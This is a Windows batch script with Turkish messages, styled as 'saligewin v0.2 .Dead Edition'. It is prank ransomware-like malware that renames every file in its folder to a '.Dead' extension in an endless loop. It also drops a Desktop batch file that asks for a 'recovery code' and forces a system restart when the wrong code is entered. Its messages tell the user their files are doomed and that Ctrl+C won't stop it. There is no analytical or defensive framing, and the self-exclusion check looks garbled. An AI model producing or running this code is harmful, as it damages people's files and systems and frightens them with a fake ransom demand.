@echo off
title saligewin.exe v0.2 - .Dead Edition
color 0c
mode con cols=85 lines=30
echo.
echo  SALIGEWIN v0.2 ".Dead" aktif ediliyor...
echo  Tüm dosyalar artık .Dead olacak...
timeout /t 4 >nul

:deadloop
cls
echo.
echo  [SALIGEWIN] Dosyalariniz olume mahkum ediliyor...
echo.

for %%x in (*) do (
    if not "%%x"=="%~nx%~xx" (
        if not "%%~xx"==".Dead" (
            ren "%%x" "%%~nx.Dead" >nul 2>&1
            echo %%x  --->  %%~nx.Dead
            timeout /t 1 >nul
        )
    )
)

echo.
echo  Masaüstündeki her şey .Dead oldu.
echo  Artık hiçbir program açılmaz, hiçbir fotoğraf görünmez...
echo  A

echo @echo off > "%userprofile%\Desktop\KodYazX.bat"
echo echo KURTARMA KODU GIRIN: >> "%userprofile%\Desktop\KodYazX.bat"
echo set /p code= >> "%userprofile%\Desktop\KodYazX.bat"
echo if "%code%"=="535631" goto kurtar >> "%userprofile%\Desktop\KodYazX.bat"
echo echo YANLIS KOD. SISTEM 10 SANIYEDE YOK >> "%userprofile%\Desktop\KodYazX.bat"
echo timeout /t 10 >nul >> "%userprofile%\Desktop\KodYazX.bat"
echo shutdown -f -r -t 0 >> "%userprofile%\Desktop\KodYazX.bat"
echo :kurtar >> "%userprofile%\Desktop\KodYazX.bat"
echo echo SADECE SAKA LAN :) >> "%userprofile%\Desktop\KodYazX.bat"
echo echo Ama yine de biraz .Dead kaldi haha >> "%userprofile%\Desktop\KodYazX.bat"
echo pause >> "%userprofile%\Desktop\KodYazX.bat"

echo.
echo  saligewin v0.2 tamamlandi.
echo  Dosyalarin artik uzantisi: .Dead
echo  İşin bitti R.I.P
echo.
echo  Cikmak icin Ctrl+C (ise yaramaz)
ping localhost -n 6 >nul
goto deadloop
